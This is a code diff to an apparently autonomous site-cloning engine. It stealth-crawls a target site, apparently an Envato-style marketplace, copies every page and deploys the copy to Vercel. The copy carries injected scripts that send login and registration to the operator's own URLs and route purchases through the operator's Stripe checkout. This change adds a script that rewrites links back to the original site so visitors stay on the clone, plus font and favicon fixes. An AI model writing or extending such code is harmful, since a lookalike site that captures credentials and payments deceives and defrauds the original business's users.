@@ -4,7 +4,7 @@ import { createStealthSession, releaseSession, CDPClient, crawlSiteStealth } fro
 import { clonePageAssets, rewriteInternalLinks, pathToFilename, buildSearchScript, buildStripeCheckoutScript, buildSupabaseFormScript, buildCatalogScript, buildFormHandlerScript } from '../../shared/fullSiteClone.ts';
 import { slugify, createVercelProject, disableVercelSso, deployToVercelMultiFile, createDriveFolder, createGitHubRepo, pushGitHubFile, createSupabaseProject } from '../../shared/launchInfra.ts';
 import { buildAllAiToolPages, rewriteAiToolLinks, AI_TOOLS, buildAiToolsSidebarScript, buildAiLinkInterceptorScript, buildAllCategoryPages, CATEGORY_PAGES } from '../../shared/aiToolPages.ts';
-import { buildAuthInterceptorScript, buildNavLinkResolverScript } from '../../shared/fullSiteClone.ts';
+import { buildAuthInterceptorScript, buildNavLinkResolverScript, buildBrandLinkFixScript, buildFontFixScript } from '../../shared/fullSiteClone.ts';
 
 // Autonomous full-site clone engine — sitemap-driven (not BFS), so it discovers
 // ALL pages upfront and clones every one. Handles 100+ pages in a single run by
@@ -376,6 +376,10 @@ export default async function(req: Request) {
     const authInterceptorScript = buildAuthInterceptorScript(myLoginUrl, myRegisterUrl);
     // Nav-link resolver — rewrite href="#" dead links to real generated pages
     const navResolverScript = buildNavLinkResolverScript(myRegisterUrl, myLoginUrl);
+    // Brand-link fixer — rewrite external links to the original site's root to `/`
+    const brandLinkFixScript = buildBrandLinkFixScript(target_url);
+    // Font fix — strip external @font-face rules to eliminate CORS font failures
+    const fontFixScript = buildFontFixScript();
 
     // Category pages — dedicated pages for each Envato category (replaces 404 fallback)
     const categoryPages = buildAllCategoryPages(catalogApiUrl, checkoutUrl, myLoginUrl, myRegisterUrl);
@@ -391,7 +395,12 @@ export default async function(req: Request) {
     for (const meta of pageMetadata) {
       let html = new TextDecoder().decode(fileMap.get(meta.filename)!);
       html = rewriteAiToolLinks(html);
-      const inject = searchScript + '\n' + catalogScript + '\n' + checkoutScript + '\n' + aiSidebarScript + '\n' + aiLinkInterceptor + '\n' + authInterceptorScript + '\n' + navResolverScript + (supabaseFormScript ? '\n' + supabaseFormScript : '');
+      // Inject favicon link tag into <head> to eliminate favicon 404s
+      const faviconTag = '<link rel="icon" type="image/svg+xml" href="/favicon.svg">';
+      if (/<head[^>]*>/i.test(html) && !/rel=["']icon["']/i.test(html)) {
+        html = html.replace(/<head[^>]*>/i, m => m + '\n' + faviconTag);
+      }
+      const inject = searchScript + '\n' + catalogScript + '\n' + checkoutScript + '\n' + aiSidebarScript + '\n' + aiLinkInterceptor + '\n' + authInterceptorScript + '\n' + navResolverScript + '\n' + brandLinkFixScript + '\n' + fontFixScript + (supabaseFormScript ? '\n' + supabaseFormScript : '');
       if (html.includes('</body>')) {
         html = html.replace('</body>', inject + '\n</body>');
       } else {
@@ -444,6 +453,11 @@ export default async function(req: Request) {
       const page404 = build404Page(resolveUrl, target_url, business_name || '', targetOrg || '', searchScript);
       fileMap.set('404.html', new TextEncoder().encode(page404));
 
+      // Favicon — simple inline SVG data URI to eliminate favicon 404s
+      const faviconSvg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#0a0a0a"/><text x="16" y="22" font-size="18" font-weight="bold" text-anchor="middle" fill="#FFD700">C</text></svg>`;
+      fileMap.set('favicon.svg', new TextEncoder().encode(faviconSvg));
+      fileMap.set('favicon.ico', new TextEncoder().encode(faviconSvg));
+
       // vercel.json with security headers + clean URLs
       const vercelJson = JSON.stringify({
         cleanUrls: true,
@@ -451,7 +465,7 @@ export default async function(req: Request) {
         headers: [{
           source: "/(.*)",
           headers: [
-            { key: "Content-Security-Policy", value: "default-src 'self' 'unsafe-inline' 'unsafe-eval' https: data: ; img-src * data: ; font-src * ; media-src * ;" },
+            { key: "Content-Security-Policy", value: "default-src 'self' 'unsafe-inline' 'unsafe-eval' https: data: ; img-src * data: ; font-src 'self' data: ; media-src * ;" },
             { key: "X-Frame-Options", value: "SAMEORIGIN" },
             { key: "X-Content-Type-Options", value: "nosniff" },
             { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
